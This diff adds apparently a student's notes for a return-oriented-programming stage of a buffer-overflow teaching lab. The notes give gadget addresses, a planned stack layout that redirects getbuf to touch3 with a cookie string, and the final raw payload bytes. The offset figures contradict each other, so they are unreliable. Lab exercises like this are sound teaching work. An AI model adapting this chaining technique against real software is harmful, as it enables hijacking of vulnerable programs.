@@ -1,0 +1,63 @@
+0x55640088 is rsp after calling getbuf
+
+touch3 is in
+0x401997
+
+commands order (bottom to top)
+
+string
+...
+...
+touch3 address
+movq rax, rdi (setval_392) -> (0x401a55 + 0x2 = 0x401a57)
+lea (%rdi,%rsi,1), %rax (add_xy) -> (0x401a75 + 0x0 = 0x401a75)
+movq rax rdi (setval_392) -> (0x401a55 + 0x2 = 0x401a57)
+movq rsp rax (addval_366) -> (0x401a9b + 0x2 = 0x401a9d)
+movl edx esi (setval_137) -> (0x401b0e + 0x3 = 0x401b11)
+movl ecx edx (setval_181) -> (0x401af3 + 0x2 = 0x401af5)
+movl eax ecx (addval_494) -> (0x401b07 + 0x2 = 0x401b09)
+offset
+popq rax (addval_451) -> (0x401a41 + 0x4 = 0x401a45)
+
+
+so stack should have:
+high address
+
+33 36 36 31 61 39 39 34 // cookie str
+00 00 00 00 00 40 19 97 // touch3 addr
+00 00 00 00 00 40 1a 57 // movq rax rdi
+00 00 00 00 00 40 1a 75 // lea (rdi, rsi, 1) rax
+00 00 00 00 00 40 1a 57 // movq rax rdi
+00 00 00 00 00 40 1a 9d // movq rsp rax
+00 00 00 00 00 40 1b 11 // movl edx esi
+00 00 00 00 00 40 1a f5 // movl ecx edx
+00 00 00 00 00 40 1b 09 // movl eax ecx
+00 00 00 00 00 00 00 a8 // offset (0x8 + (0x8 * 0x9))
+00 00 00 00 00 40 1a 45 // popq rax
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+low address
+
+exploit:
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+45 1a 40 00 00 00 00 00
+20 00 00 00 00 00 00 00
+09 1b 40 00 00 00 00 00
+f5 1a 40 00 00 00 00 00
+11 1b 40 00 00 00 00 00
+9d 1a 40 00 00 00 00 00
+57 1a 40 00 00 00 00 00
+75 1a 40 00 00 00 00 00
+57 1a 40 00 00 00 00 00
+97 19 40 00 00 00 00 00
+33 36 36 31 61 39 39 34
+00 00 00 00 00 00 00 00
